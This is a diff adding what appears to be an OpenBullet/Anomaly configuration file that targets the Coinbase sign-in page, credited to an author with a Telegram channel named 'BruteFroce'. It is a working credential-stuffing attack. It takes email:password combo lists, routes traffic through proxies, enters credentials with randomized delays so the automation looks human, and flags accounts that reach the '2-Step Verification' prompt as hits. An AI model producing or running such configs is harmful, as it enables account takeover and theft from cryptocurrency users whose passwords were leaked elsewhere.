@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "CoinBase.Com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-20T16:21:23.7347771-07:00",
+  "AdditionalInfo": "T.me/BruteFroce",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#O BROWSERACTION Open 
+
+NAVIGATE "https://www.coinbase.com/signin" 
+
+#SUS BROWSERACTION SendKeys "<USER>" 
+
+#random FUNCTION RandomNum 1100 2000 -> VAR "RR" 
+
+#Delay FUNCTION Delay "<RR>" -> VAR "Delay" 
+
+#SPS BROWSERACTION SendKeys "<TAB>||<PASS>" 
+
+#random FUNCTION RandomNum 1100 2000 -> VAR "RRR" 
+
+#Delay FUNCTION Delay "<RRR>" -> VAR "Delay" 
+
+#SPS BROWSERACTION SendKeys "<ENTER>" 
+
+#Wait ELEMENTACTION Id "" 
+  WaitForElement "1s" 
+
+#DOM BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+  KEYCHAIN Success OR 
+    KEY "2-Step Verification" 
+
